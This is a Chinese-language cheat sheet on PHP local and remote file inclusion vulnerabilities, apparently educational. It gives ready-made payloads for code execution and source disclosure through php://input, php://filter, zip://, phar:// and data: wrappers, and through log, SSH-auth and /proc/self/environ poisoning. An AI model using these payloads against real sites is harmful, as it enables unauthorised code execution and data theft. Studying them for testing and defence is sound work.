# 包含漏洞 PHP

## 0x01 基础
### 危险函数
- include()
- include_once()
- require()
- require_once()

### LFI&RFI
>RFI(Remote File Inclusion)  
前提：php.ini中进行配置   
`allow_url_fopen = On`   
`allow_url_include = On`   

## 0x02 漏洞利用

### php伪协议

#### 1. php://input
可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行

前提：需要开启allow_url_include=on，对allow_url_fopen不做要求

EXP：
```
http://127.0.0.1/index.php?file=php://input 

POST Data:
<?php phpinfo();?>
```

#### 2. php://filter

>前提：只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求

EXP:   
```
http://127.0.0.1/index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php
```

#### 3. zip://伪协议
zip://可以访问压缩文件中的文件

>前提：使用zip协议，需要将#编码为%23，所以需要PHP 的版本> =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23。

EXP:
```
http://127.0.0.1/index.php?file=zip://test.zip#shell.php
```
#### 4. phar://伪协议
与zip://协议类似，但用法不同，zip://伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar://伪协议中是用/把压缩文件路径和压缩文件的子文件名隔开，即

EXP:
```
http://127.0.0.1/index.php?file=phar://test.phar/shell.php
```
#### 5.data:text/plain

和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同

>前提：allow_url_fopen参数与allow_url_include都需开启

EXP:   
```
http://127.0.0.1/index.php?file=data:text/plain,<?php 执行内容 ?>
http://127.0.0.1/index.php?file=data:text/plain;base64,编码后的php代码
```
#### 6. file://伪协议
file:// 用于访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。   
EXP:   
```
http://127.0.0.1/index.php?file=file://文件绝对路径
```

### other

#### 7. session
>前提：session文件路径已知，且其中内容部分可控。

常见存放位置：   
- /var/lib/php/sess_PHPSESSID
- /var/lib/php/sess_PHPSESSID
- /tmp/sess_PHPSESSID
- /tmp/sessions/sess_PHPSESSID

session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。

#### 8. 日志
很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。    

#### 9. SSH log
>需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log

EXP:
```
$ ssh '<?php phpinfo(); ?>'@remotehost
```

#### 10. /proc/self/environ
>前提：   
php以cgi方式运行，这样environ才会保持UA头。   
environ文件存储位置已知，且environ文件可读。   

EXP

```
GET /index.php?file=../../../../proc/self/environ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 <?phpinfo();?> 
Connection: close
```

## Ref
- [php文件包含漏洞](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
- [浅谈文件包含漏洞](https://xz.aliyun.com/t/7176)